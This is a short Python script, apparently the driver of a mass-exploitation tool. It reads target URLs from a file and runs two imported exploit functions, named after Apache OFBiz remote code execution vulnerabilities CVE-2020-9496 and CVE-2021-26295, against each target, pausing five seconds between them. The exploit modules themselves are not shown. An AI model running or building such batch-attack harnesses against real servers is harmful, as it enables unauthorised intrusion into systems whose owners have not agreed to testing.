from time import sleep

from OFBiz_CVE_2020_9496 import CVE_2020_9496
from OFBiz_CVE_2021_26295 import CVE_2021_26295

url = open('urls.txt').readlines()
for i in url:
    CVE_2020_9496(i)
    CVE_2021_26295(i)
    sleep(5)